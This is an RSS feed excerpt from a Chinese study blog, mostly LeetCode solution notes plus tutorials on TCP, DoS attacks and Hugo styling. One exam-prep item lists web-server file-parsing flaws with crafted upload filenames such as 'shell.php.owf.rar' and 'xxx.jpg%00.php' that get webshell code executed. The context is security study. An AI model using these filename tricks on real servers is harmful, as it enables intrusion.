      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1438.-%E7%BB%9D%E5%AF%B9%E5%B7%AE%E4%B8%8D%E8%B6%85%E8%BF%87%E9%99%90%E5%88%B6%E7%9A%84%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/</link>
      <pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1438.-%E7%BB%9D%E5%AF%B9%E5%B7%AE%E4%B8%8D%E8%B6%85%E8%BF%87%E9%99%90%E5%88%B6%E7%9A%84%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/</guid>
      <description>定场句：人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。
题目链接：https://leetcode-cn.com/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/
题目  给你一个整数数组 nums ，和一个表示限制的整数 limit，请你返回最长连续子数组的长度，该子数组中的任意两个元素之间的绝对差必须小于或者等于 limit 。
如果不存在满足条件的子数组，则返回 0 。
示例1
  输入： nums = [8,2,4,7], limit = 4
  输出： 2
  解释： 所有子数组如下：
  [8] 最大绝对差 |8-8| = 0 &amp;lt;= 4.
[8,2] 最大绝对差 |8-2| = 6 &amp;gt; 4.
[8,2,4] 最大绝对差 |8-2| = 6 &amp;gt; 4.
[8,2,4,7] 最大绝对差 |8-2| = 6 &amp;gt; 4.
[2] 最大绝对差 |2-2| = 0 &amp;lt;= 4.
[2,4] 最大绝对差 |2-4| = 2 &amp;lt;= 4.</description>
    </item>
    
    <item>
      <title>错题本 | LeetCode567. 字符串的排列</title>
      <link>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode567.-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97/</link>
      <pubDate>Thu, 11 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode567.-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97/</guid>
      <description>今天是农历除夕，然而近年来年味渐淡，凡有亲朋在，便是好时节，也无需对此日特别注重了。
题目链接：https://leetcode-cn.com/problems/permutation-in-string/
题目  给定两个字符串 s1 和 s2，写一个函数来判断 s2 是否包含 s1 的排列。
换句话说，第一个字符串的排列之一是第二个字符串的子串。
示例1
  输入： s1 = &amp;ldquo;ab&amp;rdquo; s2 = &amp;ldquo;eidbaooo&amp;rdquo;
  输出： True
  解释： s2包含s1的排列之一（“ba”）
  示例2
  输入： s1= &amp;ldquo;ab&amp;rdquo; s2 = &amp;ldquo;eidboaoo&amp;rdquo;
  输出： False
  数据范围
 输入的字符串只包含小写字母 两个字符串的长度都在 [1, 10,000] 之间   分析  s2的某个子串包含s1的排列，即s2的某个子串中字母分布与s1完全一样。
我最先想到使用一个集合来保存s1的所有字母，使用滑动窗口left ~ right遍历s2中的每个子串：
 当某个字符不在集合中时，left = right = right + 1 当某个字符在集合中时，从集合中删除该字符  按照上面的规则，当某个子串完全包含s1中的所有字符时，遍历完这个子串之后集合就变为空。</description>
    </item>
    
    <item>
      <title>错题本 | LeetCode703. 数据流中的第 K 大元素</title>
      <link>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode703.-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E7%AC%AC-k-%E5%A4%A7%E5%85%83%E7%B4%A0/</link>
      <pubDate>Thu, 11 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode703.-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E7%AC%AC-k-%E5%A4%A7%E5%85%83%E7%B4%A0/</guid>
      <description>不是吧啊Sir，这种题也错？:cry:
题目链接：https://leetcode-cn.com/problems/kth-largest-element-in-a-stream/
题目  设计一个找到数据流中第 k 大元素的类（class）。注意是排序后的第 k 大元素，不是第 k 个不同的元素。
请实现 KthLargest 类：
 KthLargest(int k, int[] nums) 使用整数 k 和整数流 nums 初始化对象。 int add(int val) 将 val 插入数据流 nums 后，返回当前数据流中第 k 大的元素。  示例1
  输入： [&amp;ldquo;KthLargest&amp;rdquo;, &amp;ldquo;add&amp;rdquo;, &amp;ldquo;add&amp;rdquo;, &amp;ldquo;add&amp;rdquo;, &amp;ldquo;add&amp;rdquo;, &amp;ldquo;add&amp;rdquo;] [[3, [4, 5, 8, 2]], [3], [5], [10], [9], [4]]
  输出： [null, 4, 5, 5, 8, 8]
  示例2
  输入： [&amp;ldquo;KthLargest&amp;rdquo;,&amp;ldquo;add&amp;rdquo;,&amp;ldquo;add&amp;rdquo;,&amp;ldquo;add&amp;rdquo;,&amp;ldquo;add&amp;rdquo;,&amp;ldquo;add&amp;rdquo;] [[2,[0]],[-1],[1],[-2],[-4],[3]]</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode992. K 个不同整数的子数组</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode992.-k-%E4%B8%AA%E4%B8%8D%E5%90%8C%E6%95%B4%E6%95%B0%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/</link>
      <pubDate>Tue, 09 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode992.-k-%E4%B8%AA%E4%B8%8D%E5%90%8C%E6%95%B4%E6%95%B0%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/subarrays-with-k-different-integers/
思路是真难想，想出来之后是真简单。
已经是我目前的水平无法搞定的程度了，在此稍作记录。
题目  给定一个正整数数组 A，如果 A 的某个子数组中不同整数的个数恰好为 K，则称 A 的这个连续、不一定独立的子数组为好子数组。
（例如，[1,2,3,1,2] 中有 3 个不同的整数：1，2，以及 3。）
返回 A 中好子数组的数目。
示例1
  输入： A = [1,2,1,2,3], K = 2
  输出： 7
  解释： 恰好由 2 个不同整数组成的子数组：[1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2].
  示例2
  输入： A = [1,2,1,3,4], K = 3
  输出： 3
  解释： 恰好由 3 个不同整数组成的子数组：[1,2,1,3], [2,1,3], [1,3,4].</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode665. 非递减数列</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode665.-%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/</link>
      <pubDate>Sun, 07 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode665.-%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/non-decreasing-array/
看到这题第一感受：简单题！
做完这题第一感受：简单题？
题目  给你一个长度为 n 的整数数组，请你判断在 最多 改变 1 个元素的情况下，该数组能否变成一个非递减数列。
我们是这样定义一个非递减数列的： 对于数组中所有的 i (0 &amp;lt;= i &amp;lt;= n-2)，总满足 nums[i] &amp;lt;= nums[i + 1]。
示例1
  输入： nums = [4,2,3]
  输出： true
  解释： 你可以通过把第一个4变成1来使得它成为一个非递减数列。
  示例2
  输入： nums = [4,2,1]
  输出： false
  数据范围
 1 &amp;lt;= n &amp;lt;= 10 ^ 4 - 10 ^ 5 &amp;lt;= nums[i] &amp;lt;= 10 ^ 5   分析  简单题毕竟还是简单题，思路初步找起来是比较容易的。</description>
    </item>
    
    <item>
      <title>DoS——拒绝服务攻击</title>
      <link>https://xrg.fj.cn/p/dos%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</link>
      <pubDate>Tue, 02 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/dos%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</guid>
      <description>网络安全理论复习开始了！
今天从最简单的开始，目标是在寒假期间整理完成《网络安全》这门课所涉及的知识。希望本系列文章能以清晰的思路将安全理论表述出来。
DoS Denial of Service，拒绝服务，是现代网络安全领域很常见的一种攻击。所谓拒绝服务，就是通过一系列手段使得原本正常运行的服务器无法再为用户的请求提供服务与应答，从而使目标业务停滞。
我们经常能看到拒绝服务的例子：使用”呼死你“软件不断地拨打某人的电话，则其他人正常呼叫的时候他永远是占线的状态；网络”水军“控评，正常的评论和留言就无法被看到；黄牛使用恶意的抢票软件抢占所有电影票，使得正常渠道无法获得``````
在计算机网络的世界中，拒绝服务攻击可以是非常粗暴的物理攻击：砸毁服务器、切断网线等；更为常见且稍微有点技术含量的是利用计算机本身的漏洞，构造恶意的网络请求来使目标系统崩溃、主机宕机、重启等。
下面介绍一些常见的DoS攻击手法。
Ping of Death Ping of Death（死亡之Ping）的原理是构造一个超大的IP包来使目标主机瘫痪。在详细解释这个手法之前，需要从ICMP协议入手，介绍Ping的基本知识。
ICMP 网际控制报文协议（ICMP）用于让主机或路由器报告差错和异常情况。ICMP报文包含在IP数据报中，作为IP数据报的数据部分，加上IP首部发送出去，因此，ICMP是一个网络层协议。
ICMP报文的种类有两种，ICMP差错报告报文和ICMP询问报文。
ICMP差错报告报文用于目标主机或到目标主机路径上的路由器向源主机报告差错和异常情况，共有5种类型：
 终点不可达。 源点抑制。由于拥塞而丢弃数据报时，要求源主机减小发送速率。 时间超过。 参数问题。路由器或目的主机收到的数据报首部中有的字段不正确。 改变路由（重定向）。路由器把重定向信息发给主机，下一次使用更好的路由。  ICMP询问报文有4种类型：
 回送请求和应答。主机向目标发送ICMP请求，如果途中没有异常，则目标收到消息后恢复ICMP响应、 时间戳请求和应答。测试来回一次的传输时间。主机填充原始时间戳，接收方受到后填充时间戳返回。 掩码地址请求和回答。 路由器询问和通告。  PING PING工作在应用层。它直接使用网络层的ICMP询问报文，而未使用传输层的TCP或UDP。如果一台主机能PING通另一台主机，证明至少存在着一条可用的物理通路。
Ping of Death 死亡之Ping攻击利用了计算机实现IP协议时存在的缺陷。早期操作系统处理IP分组时，只开辟了64KB的缓冲区用来存放收到的数据包。如果攻击者故意在ICMP Echo（即PING数据报）之后附加非常多的冗余信息，使最终的IP包的大小超过65535字节的上限，接收方在处理这么大的IP包时就会产生内存分配错误，引起系统崩溃、挂起或重启。
可以看到这种攻击的实现主要是由于IP协议栈的漏洞，那为什么叫做死亡之Ping呢？因为使用PING工具太容易完成这种攻击，以至于它也成为了这种攻击的首选武器。当然，除了PING之外的任何能够构造超大IP包的程序都能实现这个攻击。
Ping of Death攻击不好预防，因为IP存在分组机制，每个IP包看起来都非常正常。最好的办法是在系统实现层面进行完善，使内核不再对超过规定长度的包进行重组。
TearDrop 又是IP协议实现的问题。故事从IP分片讲起。
分片 我们知道，数据链路层的每个数据报能够承载的数据量是有上限的，这个上限称为最大传送单元（MTU）。因为IP数据报被封装在数据链路层的数据报中，因此链路层的MTU严格地限制着IP数据报的长度。IP包传送的路径上，有许许多多的链路，可能使用不同的链路层协议，而同时也可能有大小不一的MTU。当IP数据报的总长度大于链路MTU时，需要能够将IP数据报中的数据分装在两个或多个较小的IP数据报中，然后再作为链路层数据进行传送。这些较小的数据报称为片。
片在目的地网络层被重新组装。对于一大堆杂乱无章的片，我们如何正确地重装成一个个独立的IP数据报呢？
IP协议使用首部的标识、标志和片偏移字段来完成对片的重组。我们看看IP数据报的首部：
IP Header
第二行的标识字段占16位。它是一个计数器，每产生一个数据报就加一。分片时每个数据报片都复制一次标识号，以便能正确重装成原来的数据报。
标志位有3比特。实际上只有后面2个比特有意义。它们分别是：
 MF位（More Fragment）。当MF = 1时，表示这个数据报后面还有后续的片；当MF = 0时表示这是最后一个片。 DF位（Don&amp;rsquo;t Fragment）。只有DF = 0时才允许将一个数据报分片。若DF = 1且数据报大小大于链路层的MTU，只能丢弃并发送ICMP错误信息。  片偏移占13位。既然一个数据报能被分成好几个小片，那么每个小片需要记录自己在原始数据报中的位置，否则怎么重组呢？片偏移的单位是8B，也就意味着除了最后一个片外，每个片中的有效载荷都是8的倍数（字节）。</description>
    </item>
    
    <item>
      <title>错题本 | LeetCode888. 公平的糖果棒交换</title>
      <link>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode888.-%E5%85%AC%E5%B9%B3%E7%9A%84%E7%B3%96%E6%9E%9C%E6%A3%92%E4%BA%A4%E6%8D%A2/</link>
      <pubDate>Mon, 01 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode888.-%E5%85%AC%E5%B9%B3%E7%9A%84%E7%B3%96%E6%9E%9C%E6%A3%92%E4%BA%A4%E6%8D%A2/</guid>
      <description>美好的二月从WA一道简单题开始。
题目链接：https://leetcode-cn.com/problems/fair-candy-swap/
 描述
爱丽丝和鲍勃有不同大小的糖果棒：A[i] 是爱丽丝拥有的第 i 根糖果棒的大小，B[j] 是鲍勃拥有的第 j 根糖果棒的大小。
因为他们是朋友，所以他们想交换一根糖果棒，这样交换后，他们都有相同的糖果总量。（一个人拥有的糖果总量是他们拥有的糖果棒大小的总和。）
返回一个整数数组 ans，其中 ans[0] 是爱丽丝必须交换的糖果棒的大小，ans[1] 是 Bob 必须交换的糖果棒的大小。
如果有多个答案，你可以返回其中任何一个。保证答案存在。
示例1
  输入： A = [1,1], B = [2,2]
  输出：[1,2]
  示例2
  输入： A = [1,2], B = [2,3]
  输出：[1,2]
  数据范围
 1 &amp;lt;= A.length &amp;lt;= 10000 1 &amp;lt;= B.length &amp;lt;= 10000 1 &amp;lt;= A[i] &amp;lt;= 100000 1 &amp;lt;= B[i] &amp;lt;= 100000 保证爱丽丝与鲍勃的糖果总量不同。 答案肯定存在。   分析 希望满足交换后的总和相等，不难看出交换的数量需要满足一定的关系。</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode5667. 你能在你最喜欢的那天吃到你最喜欢的糖果吗？</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode5667.-%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E9%82%A3%E5%A4%A9%E5%90%83%E5%88%B0%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%B3%96%E6%9E%9C%E5%90%97/</link>
      <pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode5667.-%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E9%82%A3%E5%A4%A9%E5%90%83%E5%88%B0%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%B3%96%E6%9E%9C%E5%90%97/</guid>
      <description>我的第一次LeetCode周赛，本来大有希望AC三道题，结果在这个神坑上趴了半个多小时o(╥﹏╥)o
题目链接：https://leetcode-cn.com/problems/can-you-eat-your-favorite-candy-on-your-favorite-day/
题目  给你一个下标从 0 开始的正整数数组 candiesCount ，其中 candiesCount[i] 表示你拥有的第 i 类糖果的数目。同时给你一个二维数组 queries ，其中 queries[i] = [favoriteTypei, favoriteDayi, dailyCapi] 。
你按照如下规则进行一场游戏：
 你从第 0 天开始吃糖果。 你在吃完 所有 第 i - 1 类糖果之前，不能 吃任何一颗第 i 类糖果。 在吃完所有糖果之前，你必须每天 至少 吃 一颗 糖果。  请你构建一个布尔型数组 answer ，满足 answer.length == queries.length 。answer[i] 为 true 的条件是：在每天吃 不超过 dailyCapi 颗糖果的前提下，你可以在第 favoriteDayi 天吃到第favoriteTypei类糖果；否则 answer[i] 为 false 。注意，只要满足上面 3 条规则中的第二条规则，你就可以在同一天吃不同类型的糖果。
请你返回得到的数组 answer 。
示例1
  输入：candiesCount = [7,4,5,3,8], queries = [[0,2,2],[4,2,4],[2,13,1000000000]]</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode778. 水位上升的泳池中游泳</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode778.-%E6%B0%B4%E4%BD%8D%E4%B8%8A%E5%8D%87%E7%9A%84%E6%B3%B3%E6%B1%A0%E4%B8%AD%E6%B8%B8%E6%B3%B3/</link>
      <pubDate>Sat, 30 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode778.-%E6%B0%B4%E4%BD%8D%E4%B8%8A%E5%8D%87%E7%9A%84%E6%B3%B3%E6%B1%A0%E4%B8%AD%E6%B8%B8%E6%B3%B3/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/swim-in-rising-water/
又是一道不错的复习题，借此回顾回顾BFS和SPFA。
BFS Breadth First Search，宽度优先搜素。
已知图G = (V, E)和一个源顶点s，宽度优先搜索以一种系统的方式探寻G的边，从而“发现”s所能到达的所有顶点，并计算s到所有这些点的距离（最少边数）。
使用一个数组visited维护每个顶点先前是否被访问过；使用一个数组dist维护源点到每个顶点的距离。visited初始化为全0，dist初始化为全正无穷。
使用一个队列q维护当前正在访问的点，每次从队首中取出head来进行操作。对于head的邻接点tmp，若我们之前没有访问过它，则源点到它的距离就是源点到head的距离加1。我们记dist[tmp] = dist[head] + 1，然后将tmp放入队列q中，之后的某个时刻，tmp会被取出，然后继续找出与它邻接且没被访问过的点，直到队列为空，所有可达的点都被访问过了。
BFS搜索的方法就像那荡开的涟漪，从源点开始不断向外扩张，最终遍历结束，涟漪消散。
使用当年蹭HDU数据结构课的一道作业来进行BFS的回顾：
 题目描述
一个迷宫由R行C列格子组成，有的格子里有障碍物，不能走；有的格子是空地，可以走。 给定一个迷宫，求从左上角走到右下角最少需要走多少步(数据保证一定能走到)。只能在水平方向或垂直方向走，不能斜着走。
输入格式
第一行是两个整数，Ｒ和Ｃ，代表迷宫的长和宽。（ 1&amp;lt;= R，C &amp;lt;= 40) 接下来是Ｒ行，每行Ｃ个字符，代表整个迷宫。 空地格子用&#39;.&amp;lsquo;表示，有障碍物的格子用&amp;rsquo;#&amp;lsquo;表示。 迷宫左上角和右下角都是&amp;rsquo;.&#39;。
输出格式
输出从左上角走到右下角至少要经过多少步（即至少要经过多少个空地格子）。计算步数要包括终点,，不包括起点。如果不能到达右下角，输出“NO”.
输入1：
5 5
..###
#&amp;hellip;.
#.#.#
#.#.#
#.#..
输出1： 8
 这是一道宽搜模板题。从源点出发，向四个方向（上下左右）探寻邻接点，若邻接点合法（即没有越界）且该点不是障碍（&#39;#&#39;）且该点未被访问，则记录它到源点的距离。
我一直不会证明宽搜的正确性，总觉得它理所当然，就直接放代码了：
#include &amp;lt;queue&amp;gt;#include &amp;lt;iostream&amp;gt;#include &amp;lt;algorithm&amp;gt;#include &amp;lt;vector&amp;gt; using namespace std; typedef struct { int x, y; } Point; char graph[44][44]; int visited[44][44]; int dist[44][44]; int R, C; queue&amp;lt;Point&amp;gt; q; vector&amp;lt;pair&amp;lt;int, int&amp;gt;&amp;gt; dirs = { {0, 1}, {1, 0}, {0, -1}, {-1, 0} }; void bfs() { Point head; Point tmp; // 源点入队 	tmp.</description>
    </item>
    
    <item>
      <title>安全岗笔试题——1</title>
      <link>https://xrg.fj.cn/p/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%981/</link>
      <pubDate>Fri, 29 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%981/</guid>
      <description>&amp;quot;安全岗笔试题——1&amp;quot;  近期准备安全岗实习的笔试，结果悲伤地证实了我的知识体系中还是存在很多漏洞，在此对我不够熟悉的题目进行记录。
以下哪些说法是正确的？（）
A、 iOS系统从iOS6开始引入kernel ASLR安全措施
B、 主流的iPhone手机内置了AES和RSA硬件加速解密引擎
C、 安卓系统采用了安全引导链（Secureboot Chain），而iOS系统则未采用
D、 Android4.1 系统默认启用了内存ASLR
 答案  ABD  iOS系统也采用了安全引导链，C错误   以下哪个工具可以用来运行DDoS攻击？（）
A、 菜刀
B、 WSI
C、 Dosend
D、 Chkrootkit
 答案  C  中国菜刀是一款专业的网站管理软件； WSI是PHP注入工具，具体可以参考这篇文章； Dosend是一款Linux发包工具，可以用来实现DDoS攻击； chkrootkit是用来检查rootkit的。   以下哪些服务器曾被发现文件解析漏洞？（）
A、 Apache
B、 IIS
C、 nginx
D、 squid
 答案  ABC  A、Apache解析漏洞：该服务器从右到左判断解析文件，如果为不可识别解析，就继续往左判断。如shell.php.owf.rar，其中.owf和.rar是Apache不可解析的，就将此文件最终解析为shell.php  B、IIS解析漏洞：一是IIS5.x/6.0中，网站下建立名为.asp/.asa的文件夹，其内的任何文件都被当成asp文件解析并执行；二是123.asp;.jpg会被解析为123.asp。  C、nginx解析漏洞：一是nginx默认Fast-CGI开启的情况下，黑客上传名为upupimage.jpg，内容为PHP代码的文件，然后访问upupimage.jpg/.php，在这个目录下就会生成一句话木马shell.php；二是在图片中嵌入PHP代码，然后通过访问xxx.jpg%00.php来执行其中的代码。影响版本0.5,0.6,0.7&amp;lt;=0.7.65,0.8&amp;lt;=0.0.37。  squid爆出来的更多是拒绝服务攻击。它是一个高效的Web缓存及代理程序，最初是为Unix平台开发的，现在也被移植到Linux和大多数的Unix类系统中，最新的Squid可以运行在Windows平台下。   以下哪几种工具可以对网站进行自动化Web漏洞扫描？（）
A、 hackbar</description>
    </item>
    
    <item>
      <title>传输层协议——TCP</title>
      <link>https://xrg.fj.cn/p/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AEtcp/</link>
      <pubDate>Wed, 27 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AEtcp/</guid>
      <description>传输层 传输层的功能
从通信和信息处理的角度看，传输层向它上面的应用层提供通信服务，它属于面向通信部分的最高层，同时也是用户功能中的最低层。
实际上，传输层起到一个承上启下的作用。它之下的网络层、数据链路层、物理层被称为通信子网，其实现细节对用户是不可见的。
传输层的功能如下：
 提供进程之间的逻辑通信（即端到端的通信）。进程间的逻辑通信是指本主机上运行的某个进程和对方主机上运行的某个进程进行通信。而与此相对的，网络层提供的是点到点的通信，指的是本主机与对方主机的通信。 复用和分用。多个进程可以使用同一个传输层协议封装自己的数据，而对方主机可以使用同样的协议正确解析这些数据，交付给正确的应用进程。 差错检测。传输层检测首部和数据部分的差错，而网络层只检查IP数据报的首部，不检查数据部分是否出错。 提供两种不同的传输协议，即面向连接的TCP和无连接的UDP。网络层无法同时实现两种协议（即要么使用面向连接的服务，如虚电路；要么只提供无连接的服务，如数据报）。  需要注意，在计算机网络层次结构中，网络层被认为是不可靠的服务，即网络层传输的数据可能出现丢失、混乱或重复，这些不可靠的问题需要由传输层来考虑解决。
端口的概念
网络层的数据交付是点到点的，也就是主机到主机的交付。当一个IP数据报到达了主机，如何判断这份数据报应该交给哪个进程呢？传输层引入了端口，每个进程与一个端口号绑定。主机把IP数据报解封，就能看到里面的传输层数据包，其包头中写明了目的端口，只需要把数据交付给对应于这个端口的进程即可。
结合IP和端口，就能唯一地标识一台主机上的一个进程，这就是Socket（套接字）：
套接字 = （主机IP地址， 端口号）
TCP  TCP协议的特点
 TCP是在不可靠的IP层之上实现的可靠的数据传输协议，它主要针对之前提及的网络层数据传输的丢失、混乱或重复问题，实现传输层上的可靠、有序、无丢失和不重复。
TCP的主要特点如下：
 面向连接。 每条连接只能有两个端点，即一对一的。 可靠的交付服务，保证数据无差错、不丢失、不重复且有序。 全双工通信，即任何时刻双方都能进行数据的发送。为此，双方都应该设置发送缓存和接收缓存，用来临时存放双向通信的数据。 面向字节流。计算机网络中常见的一个问题是：面向字节和面向报文有什么区别？ 面向字节流是指TCP将应用程序交付下来的数据仅视为一连串的无结构的字节流，发送的时候按照TCP的规则进行发送，不会考虑保留原始数据的边界；而面向报文是指每次发送的数据作为一个报文，一个报文是一块有结构的数据。   TCP报文段
 想要理解TCP的连接建立等等细节，认识其报头是必要的。TCP有固定的20B报头，变长字段配合填充字段使TCP报头长度始终是4B的整数倍。由于首部长度字段只有4位，故报头最长为15 * 4 = 60B
TCP报头格式如下：
TCP Header
每个字段的含义可以参见这篇文章。
 TCP连接管理
 TCP是面向连接的协议，每个TCP连接都有三个阶段：连接建立、数据传输和连接释放。TCP的连接管理就是使运输连接的建立和释放都能正常进行。
TCP连接的端口称为套接字（socket）或插口。连接采用C/S方式，主动发起连接的进程称为客户机（Client），被动等待连接的进程称为服务器（Server）。
连接的建立分为3个步骤，即三次握手：
TCP three-way-handshake
 第一步：客户机向服务器发送一个报文段，该报文段不含应用层数据，首部中的SYN标志被置为1，且该报文段占用了一个随机序号seq=x。 第二步：服务器收到连接请求，如同意连接，就向客户机发回确认，并为该连接分配TCP缓存和变量。确认报文中SYN和ACK都置为1，seq是服务器选用的初始随机序号，ack表示期望收到的下一个客户机报文序号。 第三步：客户机接收到确认报文，也要为该连接分配缓存和变量，并回复确认。  完成三次握手之后，双方的应用进程在任何时刻都可以发送数据（全双工）。
注意这里的第二步握手，服务器在此步分配资源，那么如果客户端不回应第三步的确认报文，则服务器在原地忙等，过一段时间后才删除这些资源；如果快速发送大量的SYN包给特定服务器，将耗尽它的资源，使得正常的连接无法被建立，这就是典型的SYN Flood攻击。
 三次握手的必要性：
进行三次握手是必要的。
从直觉进行理解：第一步握手是客户端向服务器发送数据，此时双方对信道的性质还不了解；第二步握手成功之后，客户端知道了服务器能够收到自己的数据，但服务器还不知道客户端能不能收到自己的数据；第三步握手成功之后，服务器知道客户端能收到自己的数据，可以开始通信。
进一步地，考虑以下这种两次握手的情况：</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode959. 由斜杠划分区域</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode959.-%E7%94%B1%E6%96%9C%E6%9D%A0%E5%88%92%E5%88%86%E5%8C%BA%E5%9F%9F/</link>
      <pubDate>Mon, 25 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode959.-%E7%94%B1%E6%96%9C%E6%9D%A0%E5%88%92%E5%88%86%E5%8C%BA%E5%9F%9F/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/regions-cut-by-slashes/
令我思考很久的一道题，最后还是学着官方题解做出来的([1])。思考过程中也想过并查集，然而并没有想到题解中的做法；想到过求一个图中环路的个数，然而不会。
题目 在由 1 x 1 方格组成的 N x N 网格 grid 中，每个 1 x 1 方块由 /、\ 或空格构成。这些字符会将方块划分为一些共边的区域。
（请注意，反斜杠字符是转义的，因此 \ 用 &amp;ldquo;\\&amp;rdquo; 表示。）。
返回区域的数目。
分析  将单元格进一步细分，便于并查集操作。
每个单元格对角点互连，即可分成四个小三角形（图1），根据本格中的字符是/还是\，合并不同的小三角形。
图1. 单元格划分
  格内合并
 当本格字符为空格时，所有小三角形处于同一个区域中，全部合并； 当本格字符为/时，合并0号和3号，合并1号和2号，且这两个区域不互通； 当本格字符为\时，合并0号和1号，合并3号和2号，且这两个区域不互通。    格间合并
 格间合并是指单元格之间的小三角形合并。无论本单元格中的字符是什么，当前单元格的1号三角形和右边单元格的3号永远处于同一个区域，当前单元格的2号和下边单元格的0号永远处于同一个区域。同理考虑左边和上边单元格。 我们要遍历所有的单元格，故格间合并只需要顾及左右两侧邻居之一、上下两侧邻居之一即可；例如对于每个单元格只考虑与其右边单元格和下边单元格的合并，每个单元格都如此，则所有单元格都能正常完成合并。    最终操作
 遍历每个单元格，按照字符进行格内合并；如果右边和下边有邻居就进行格间合并。这样最后剩下的独立并查集个数就是最终划分得到的区域数。 这种方式的关键在于格间合并，无论格内字符是什么，格间的联通总能使得离散的区域聚到一起。     模拟  考虑对于示例4：
 输入：[&amp;quot;/\\&amp;quot;,&amp;quot;\\/&amp;quot;] 输出：5  网格如下：
图2. 网格</description>
    </item>
    
    <item>
      <title>博客搭建指南——3</title>
      <link>https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%973/</link>
      <pubDate>Tue, 19 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%973/</guid>
      <description>总不能让这个博客老是在记录家常菜啊。
本篇主要介绍hugo博客的进阶美化方法，根据本篇的讲解，结合自己的主题进行实践，有助于打造一个真正属于自己的博客。
 1. CSS和SCSS
 CSS（层叠样式表）是一种用来表现HTML或XML等文件样式的计算机语言。CSS的存在使得HTML页面源码可以更专注于网页架构的设计，而不用在源码中加入许多关于样式的字段，极大地提高了代码的可读性和简洁性，同时，使得网页样式变得更好维护。
